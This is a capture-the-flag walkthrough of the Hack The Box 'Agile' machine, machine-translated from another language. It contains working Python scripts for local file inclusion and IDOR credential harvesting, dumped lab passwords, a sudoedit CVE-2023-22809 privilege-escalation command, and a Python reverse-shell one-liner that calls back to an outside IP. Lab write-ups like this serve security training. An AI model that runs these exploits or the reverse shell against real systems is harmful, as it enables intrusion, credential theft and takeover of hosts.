[nmap](https://cn-sec.com/archives/tag/nmap) -sCV --min-rate=1000 -Pn 10.10.11.203


echo "10.10.11.203 superpass.htb" >> /etc/hosts

After scanning the directory, the download path was found, and an error message appeared when accessing, and the parameter was found to be fn

Read /etc/passwd and find that login permissions are required. Register an account and read it.

We can create a script in python to automate this process, only need to enter the file path
1.  `cat lfi.py`              `#!/usr/bin/python3``import requests, sys`
2.  `if len(sys.argv) < 2:`    `print(f"n33[0;37m[33[0;31m-33[0;37m] Uso: python3 {sys.argv[0]} n")`    `sys.exit(1)`
3.  `target = "http://superpass.htb"``session = requests.Session()`
4.  `data = {"username": "123", "password": "123", "submit": ""}``session.post(target + "/account/login", data=data)`
5.  `params = {"fn": ".." + sys.argv[1]}``request = session.get(target + "/download", params=params)`
6.  `print(request.text.strip())`

8.  `└─# python lfi.py /etc/passwd``root:x:0:0:root:/root:/bin/bash``daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin``bin:x:2:2:bin:/bin:/usr/sbin/nologin``sys:x:3:3:sys:/dev:/usr/sbin/nologin``sync:x:4:65534:sync:/bin:/bin/sync``games:x:5:60:games:/usr/games:/usr/sbin/nologin``man:x:6:12:man:/var/cache/man:/usr/sbin/nologin``lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin``mail:x:8:8:mail:/var/mail:/usr/sbin/nologin``news:x:9:9:news:/var/spool/news:/usr/sbin/nologin``uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin``proxy:x:13:13:proxy:/bin:/usr/sbin/nologin``www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin``backup:x:34:34:backup:/var/backups:/usr/sbin/nologin``list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin``irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin``gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin``nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin``_apt:x:100:65534::/nonexistent:/usr/sbin/nologin``systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin``systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin``messagebus:x:103:104::/nonexistent:/usr/sbin/nologin``systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin``pollinate:x:105:1::/var/cache/pollinate:/bin/false``sshd:x:106:65534::/run/sshd:/usr/sbin/nologin``usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin``corum:x:1000:1000:corum:/home/corum:/bin/bash``dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin``mysql:x:109:112:MySQL Server,,,:/nonexistent:/bin/false``runner:x:1001:1001::/app/app-testing/:/bin/sh``edwards:x:1002:1002::/home/edwards:/bin/bash``dev_admin:x:1003:1003::/home/dev_admin:/bin/bash``_laurel:x:999:999::/var/log/laurel:/bin/false`

Pointing to the wrong file reads us the path of the running .py file

1.  `└─# python lfi.py /etc/passwds | grep app`

1.  `└─# python lfi.py /app/app/superpass/views/vault_views.py``import flask``import subprocess``from flask_login import login_required, current_user``from superpass.infrastructure.view_modifiers import response``import superpass.[service](https://cn-sec.com/archives/tag/service)s.password_service as password_service``from superpass.services.utility_service import get_random``from superpass.data.password import Password`

3.  `blueprint = flask.Blueprint('vault', __name__, template_folder='templates')`

5.  `@blueprint.route('/vault')``@response(template_file='vault/vault.html')``@login_required``def vault():`    `passwords = password_service.get_passwords_for_user(current_user.id)`    `print(f'{passwords=}')`    `return {'passwords': passwords}`

7.  `@blueprint.get('/vault/add_row')``@response(template_file='vault/partials/password_row_editable.html')``@login_required``def add_row():`    `p = Password()`    `p.password = get_random(20)`    `#import pdb;pdb.set_trace()`    `return {"p": p}`

9.  `@blueprint.get('/vault/edit_row/<id>')``@response(template_file='vault/partials/password_row_editable.html')``@login_required``def get_edit_row(id):`    `password = password_service.get_password_by_id(id, current_user.id)`
10.      `return {"p": password}`

12.  `@blueprint.get('/vault/row/<id>')``@response(template_file='vault/partials/password_row.html')``@login_required``def get_row(id):`    `password = password_service.get_password_by_id(id, current_user.id)`
13.      `return {"p": password}`

15.  `@blueprint.post('/vault/add_row')``@login_required``def add_row_post():`    `r = flask.request`    `site = r.form.get('url', '').strip()`    `username = r.form.get('username', '').strip()`    `password = r.form.get('password', '').strip()`
16.      `if not (site or username or password):`        `return ''`
17.      `p = password_service.add_password(site, username, password, current_user.id)`    `return flask.render_template('vault/partials/password_row.html', p=p)`

19.  `@blueprint.post('/vault/update/<id>')``@response(template_file='vault/partials/password_row.html')``@login_required``def update(id):`    `r = flask.request`    `site = r.form.get('url', '').strip()`    `username = r.form.get('username', '').strip()`    `password = r.form.get('password', '').strip()`
20.      `if not (site or username or password):`        `flask.abort(500)`
21.      `p = password_service.update_password(id, site, username, password)`
22.      `return {"p": p}`

24.  `@blueprint.delete('/vault/delete/<id>')``@login_required``def delete(id):`    `password_service.delete_password(id)`    `return ''`

26.  `@blueprint.get('/vault/export')``@login_required``def export():`    `if current_user.has_passwords:`        `fn = password_service.generate_csv(current_user)`        `return flask.redirect(f'/download?fn={fn}', 302)`    `return "No passwords for user"`

28.  `@blueprint.get('/download')``@login_required``def download():`    `r = flask.request`    `fn = r.args.get('fn')`    `with open(f'/tmp/{fn}', 'rb') as f:`        `data = f.read()`    `resp = flask.make_response(data)`    `resp.headers['Content-Disposition'] = 'attachment; filename=superpass_export.csv'`    `resp.mimetype = 'text/csv'`    `return resp`

Reading the code we can find an idor in this part of the code in the .py file

1.  `@blueprint.get('/vault/row/<id>')``@response(template_file='vault/partials/password_row.html')``@login_required``def get_row(id):`    `password = password_service.get_password_by_id(id, current_user.id)`
2.      `return {"p": password}`

We can see different user passwords by sending different ids. A python script can be created to iterate over the ids and get data from them

1.  `#!/usr/bin/python3``import requests, bs4``from pwn import log`
2.  `target = "http://superpass.htb"``session = requests.Session()`
3.  `data = {"username": "username", "password": "password", "submit": ""}``session.post(target + "/account/login", data=data)`
4.  `for id in range(0,10):`    `request = session.get(target + "/vault/row/" + str(id))`    `soup = bs4.BeautifulSoup(request.content, "html.parser")`    `rows = soup.find_all("tr", class_="password-row")`
5.      `for row in rows:`        `cols = row.find_all("td")`        `sitename = cols[1].get_text()`        `username = cols[2].get_text()`        `password = cols[3].get_text()`
6.          `if sitename != "":`            `log.info(f"Credentials in row {id}:")`            `print(f"tSitename: {sitename}")`            `print(f"tUsername: {username}")`            `print(f"tPassword: {password}")`            `print("r")`

When executed, it loops through ids and gets 6 passwords from different users

1.  `└─# python AgileExploit.py``[*] Credentials in row 3:`    `Sitename: hackthebox.com`    `Username: 0xdf`    `Password: 762b430d32eea2f12970`
2.  `[*] Credentials in row 4:`    `Sitename: mgoblog.com`    `Username: 0xdf`    `Password: 5b133f7a6a1c180646cb`
3.  `[*] Credentials in row 6:`    `Sitename: mgoblog`    `Username: corum`    `Password: 47ed1e73c955de230a1d`
4.  `[*] Credentials in row 7:`    `Sitename: ticketmaster`    `Username: corum`    `Password: 9799588839ed0f98c211`
5.  `[*] Credentials in row 8:`    `Sitename: agile`    `Username: corum`    `Password: 5db7caa1d13cc37c9fc2`

The last sitename: agile is the same as our target machine name, so use its username and password to log in to ssh successfully.

Listing the internal ports we can see 41829 which is not common on the system

1.  `-bash-5.1$ netstat -nat``Active Internet connections (servers and established)`                                                      `Proto Recv-Q Send-Q Local Address           Foreign Address         State`                                  `tcp        0      0 127.0.0.1:5555          0.0.0.0:*               LISTEN`                                 `tcp        0      0 127.0.0.1:56423         0.0.0.0:*               LISTEN`                                 `tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN`                                 `tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN`                                 `tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN`                                 `tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN`                                 `tcp        0      0 127.0.0.1:41829         0.0.0.0:*               LISTEN`                                 `tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN`     `tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN`     `tcp        0      0 127.0.0.1:32846         127.0.0.1:56423         TIME_WAIT`  `tcp        0      0 127.0.0.1:40522         127.0.0.1:3306          ESTABLISHED``tcp        0      0 127.0.0.1:44958         127.0.0.1:5555          TIME_WAIT`  `tcp      150      0 127.0.0.1:33290         127.0.0.1:3306          CLOSE_WAIT` `tcp        0      0 127.0.0.1:36324         127.0.0.1:41829         ESTABLISHED``tcp        0      0 127.0.0.1:50656         127.0.0.1:80            ESTABLISHED``tcp        0      0 127.0.0.1:80            127.0.0.1:50696         ESTABLISHED``tcp        0      0 127.0.1.1:22            127.0.0.1:57456         ESTABLISHED``tcp        0      0 10.10.11.203:22         10.10.14.27:56314       ESTABLISHED``tcp        0      0 10.10.11.203:22         10.10.14.38:42908       ESTABLISHED``tcp        0      0 127.0.0.1:50676         127.0.0.1:80            ESTABLISHED``tcp        0      0 127.0.0.1:50666         127.0.0.1:80            ESTABLISHED``tcp        0      0 127.0.0.1:57866         127.0.0.1:5555          TIME_WAIT`  `tcp        0      0 127.0.0.1:3306          127.0.0.1:40522         ESTABLISHED``tcp        0      0 127.0.0.1:44948         127.0.0.1:5555          TIME_WAIT`  `tcp        0      0 127.0.0.1:80            127.0.0.1:50666         ESTABLISHED``tcp        0      0 127.0.0.1:80            127.0.0.1:50656         ESTABLISHED``tcp        0      0 10.10.11.203:22         10.10.16.27:59280       ESTABLISHED``tcp        0   4284 10.10.11.203:22         10.10.16.4:57244        ESTABLISHED``tcp        0      0 127.0.0.1:80            127.0.0.1:50690         ESTABLISHED``tcp        0      0 127.0.0.1:41829         127.0.0.1:36324         ESTABLISHED``tcp        0      0 127.0.0.1:50696         127.0.0.1:80            ESTABLISHED``tcp        0      0 10.10.11.203:22         10.10.14.78:49518       ESTABLISHED``tcp        0      0 127.0.0.1:50690         127.0.0.1:80            ESTABLISHED``tcp        0      0 127.0.0.1:80            127.0.0.1:50712         ESTABLISHED``tcp        0      0 127.0.0.1:50712         127.0.0.1:80            ESTABLISHED``tcp        0      0 127.0.0.1:56423         127.0.0.1:32856         ESTABLISHED``tcp        0      0 127.0.0.1:41829         127.0.0.1:36340         ESTABLISHED``tcp        0      0 10.10.11.203:22         10.10.16.27:33362       ESTABLISHED``tcp        0      0 127.0.0.1:44972         127.0.0.1:5555          TIME_WAIT`  `tcp        0      0 127.0.0.1:44938         127.0.0.1:5555          TIME_WAIT`  `tcp        0      1 10.10.11.203:58342      8.8.8.8:53              SYN_SENT`   `tcp        0      0 127.0.0.1:57872         127.0.0.1:5555          TIME_WAIT`  `tcp        0      0 127.0.0.1:32856         127.0.0.1:56423         ESTABLISHED``tcp        0      0 127.0.0.1:36340         127.0.0.1:41829         ESTABLISHED``tcp        0      0 127.0.0.1:80            127.0.0.1:50676         ESTABLISHED``tcp        0      0 127.0.0.1:57456         127.0.1.1:22            ESTABLISHED``tcp6       0      0 :::22                   :::*                    LISTEN`     `tcp6       0      0 ::1:56423               :::*                    LISTEN`     

In the process we can see that this port is running the remote debug of Google Chrome

1.  `-bash-5.1$ ps faux | grep 41829``runner     19539  0.1  2.6 34023456 103904 ?     Sl   03:28   0:00                      _ /usr/bin/google-chrome --allow-pre-commit-input --crash-dumps-dir=/tmp --disable-background-networking --disable-client-side-phishing-detection --disable-default-apps --disable-gpu --disable-hang-monitor --disable-popup-blocking --disable-prompt-on-repost --disable-sync --enable-automation --enable-blink-features=ShadowDOMV0 --enable-logging --headless --log-level=0 --no-first-run --no-service-autorun --password-store=basic --remote-debugging-port=41829 --test-type=webdriver --use-mock-keychain --user-data-dir=/tmp/.com.google.Chrome.VCC6v1 --window-size=1420,1080 data:,``runner     19603  0.5  4.1 1184764420 163312 ?   Sl   03:28   0:01                          |       _ /opt/google/chrome/chrome --type=renderer --headless --crashpad-handler-pid=19546 --lang=en-US --enable-automation --enable-logging --log-level=0 --remote-debugging-port=41829 --test-type=webdriver --allow-pre-commit-input --ozone-platform=headless --disable-gpu-compositing --enable-blink-features=ShadowDOMV0 --lang=en-US --num-raster-threads=1 --renderer-client-id=5 --time-ticks-at-unix-epoch=-1678414886916814 --launch-time-ticks=3996020528 --shared-files=v8_context_snapshot_data:100 --field-trial-handle=0,i,1475177266462851820,14744098003185442377,131072 --disable-features=PaintHolding``corum      19709  0.0  0.0   4020  2072 pts/7    S+   03:31   0:00              _ grep 41829`

To use the port locally we will use it by port forwarding with ssh

1.  `└─# ssh corum@10.10.11.203 -L 41829:127.0.0.1:41829``corum@10.10.11.203's password: 5db7caa1d13cc37c9fc2`

Use chrome://inspect in the search bar and type`127.0.0.1:41829`

It shows us the Target SuperPassword of http://test.superpass.htb/vault, access to see the account password

We can use the username and password of the agile site again to log in via ssh

1.  `edwards``d07867c6267dcb5df0af`
2.  `corum@agile:~$ su edwards``Password:` `edwards@agile:/home/corum$` `edwards@agile:/home/corum$ id``uid=1002(edwards) gid=1002(edwards) groups=1002(edwards)`

View sudoers level permissions, we can use sudoedit as dev_admin to open 2 files

1.  `edwards@agile:/home/corum$ sudo -l``[sudo] password for edwards:` `Matching Defaults entries for edwards on agile:`    `env_reset, mail_badpass,`    `secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin,`    `use_pty`
2.  `User edwards may run the following commands on agile:`    `(dev_admin : dev_admin) sudoedit /app/config_test.json`    `(dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt`

Open the web in local python and upload it to the target machine pspy

1.  `└─# python -m http.server  80``Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...``10.10.11.203 - - [10/Mar/2023 13:37:47] "GET /pspy64 HTTP/1.1" 200 -`

Using pspy to list tasks we can find that root executed this file /app/venv/bin/activate

1.  `edwards@agile:~$ ./pspy64 |grep activate``2023/03/10 05:41:55 CMD: UID=1002  PID=1326   | grep --color=auto activate` `2023/03/10 05:41:55 CMD: UID=1002  PID=1320   | vim /var/tmp/activate.XXfIlGzM /var/tmp/config_testXXXyfw94.json` `2023/03/10 05:45:01 CMD: UID=0     PID=1480   | /bin/bash -c source /app/venv/bin/activate` 

The file has dev_admin as a writable group, if we can modify it we are root

Found CVE-2023–22809 [1] for sudoedit , which shows us some ways to exploit it

We export variables by opening /app/venv/bin/activate as an extra file

1.  `export EDITOR="vim -- /app/venv/bin/activate"`

Now we open the file /app/config_test.json which allows us to open as dev_admin at sudoers level

1.  `sudo -u dev_admin sudoedit /app/config_test.json`

Use online tools to generate python's rebound shell command, online rebound shell [2]

1.  `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.4",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`

Reverse the shell to get root.